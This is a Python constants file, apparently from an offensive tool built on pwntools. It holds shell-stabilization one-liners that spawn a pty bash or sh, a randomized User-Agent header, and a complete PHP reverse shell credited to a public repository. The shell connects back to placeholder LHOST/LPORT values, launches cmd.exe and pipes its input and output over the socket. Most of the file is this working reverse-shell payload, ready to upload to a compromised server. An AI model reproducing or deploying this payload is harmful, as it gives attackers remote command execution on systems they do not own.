from pwnlib import useragents


VERSION = '2.5'

DEFAULT_HEADERS = {
    'User-Agent': useragents.random()
}

SHELL_STABILIZATION_METHODS = {
    'python': {
        'bash': """python -c 'import pty; pty.spawn("/bin/bash")'""",
        'sh': """python -c 'import pty; pty.spawn("/bin/bash")'"""
    },
    'python3': {
        'bash': """python3 -c 'import pty; pty.spawn("/bin/bash")'""",
        'sh': """python3 -c 'import pty; pty.spawn("/bin/sh")'"""
    },
    'script': {
        'bash': 'script -qc /bin/bash /dev/null',
        'sh': 'script -qc /bin/sh /dev/null'
    }
}

# Code from https://github.com/ivan-sincek/php-reverse-shell, modified a bit to take only the windows part
SHELL_CODE = """
class Shell {
    private $addr  = null;
    private $port  = null;
    private $descriptorspec = array(
        0 => array('pipe', 'r'), 
        1 => array('pipe', 'w'), 
        2 => array('pipe', 'w')  
    );
    private $buffer  = 1024;    
    private $clen    = 0;       
    private $error   = false;   
    public function __construct($addr, $port) {
        $this->addr = $addr;
        $this->port = $port;
    }
    private function daemonize() {
        $exit = false;
        if (!function_exists('pcntl_fork')) { }
        else if (($pid = @pcntl_fork()) < 0) { } 
        else if ($pid > 0) { $exit = true; } 
        else if (posix_setsid() < 0) { }
        return $exit;
    }
    private function settings() {
        @error_reporting(0);
        @set_time_limit(0); 
        @umask(0); 
    }
    private function dump($data) {
        $data = str_replace('<', '&lt;', $data);
        $data = str_replace('>', '&gt;', $data);
        echo $data;
    }
    private function read($stream, $name, $buffer) {
        if (($data = @fread($stream, $buffer)) === false) { 
            $this->error = true;
        }
        return $data;
    }
    private function write($stream, $name, $data) {
        if (($bytes = @fwrite($stream, $data)) === false) { 
            $this->error = true;
        }
        return $bytes;
    }
    private function rw($input, $output, $iname, $oname) {
        while (($data = $this->read($input, $iname, $this->buffer)) && $this->write($output, $oname, $data)) {
            if ($oname === 'STDIN') { $this->clen += strlen($data); } 
            $this->dump($data); 
        }
    }
    private function brw($input, $output, $iname, $oname) {
        $fstat = fstat($input);
        $size = $fstat['size'];
        if ($iname === 'STDOUT' && $this->clen) {
            while ($this->clen > 0 && ($bytes = $this->clen >= $this->buffer ? $this->buffer : $this->clen) && $this->read($input, $iname, $bytes)) {
                $this->clen -= $bytes;
                $size -= $bytes;
            }
        }
        while ($size > 0 && ($bytes = $size >= $this->buffer ? $this->buffer : $size) && ($data = $this->read($input, $iname, $bytes)) && $this->write($output, $oname, $data)) {
            $size -= $bytes;
            $this->dump($data); 
        }
    }
    public function run() {
        if (!$this->daemonize()) {
            $this->settings();
            $socket = @fsockopen($this->addr, $this->port, $errno, $errstr, 30);
            if (!$socket) { } 
            else {
                stream_set_blocking($socket, false); 
                $process = @proc_open('cmd.exe', $this->descriptorspec, $pipes, null, null);
                if (!$process) {
                } else {
                    foreach ($pipes as $pipe) {
                        stream_set_blocking($pipe, false); 
                    }
                    $status = proc_get_status($process);
                    do {
                        $status = proc_get_status($process);
                        if (feof($socket)) { 
                            break;
                        } else if (feof($pipes[1]) || !$status['running']) {                 
                            break; 
                        }                                                                    
                        $streams = array(
                            'read'   => array($socket, $pipes[1], $pipes[2]), 
                            'write'  => null,
                            'except' => null
                        );
                        $num_changed_streams = @stream_select($streams['read'], $streams['write'], $streams['except'], 0); 
                        if ($num_changed_streams === false) { } 
                        else if ($num_changed_streams > 0) {
                            if (in_array($socket, $streams['read'])/*------*/) { $this->rw ($socket  , $pipes[0], 'SOCKET', 'STDIN' ); } 
                            if (($fstat = fstat($pipes[2])) && $fstat['size']) { $this->brw($pipes[2], $socket  , 'STDERR', 'SOCKET'); } 
                            if (($fstat = fstat($pipes[1])) && $fstat['size']) { $this->brw($pipes[1], $socket  , 'STDOUT', 'SOCKET'); }
                        }
                    } while (!$this->error);

                    foreach ($pipes as $pipe) {
                        fclose($pipe);
                    }
                    proc_close($process);
                }
                fclose($socket);
            }
        }
    }
}
echo '<pre>';
$sh = new Shell('LHOST', LPORT);
$sh->run();
unset($sh);
echo '</pre>';
"""
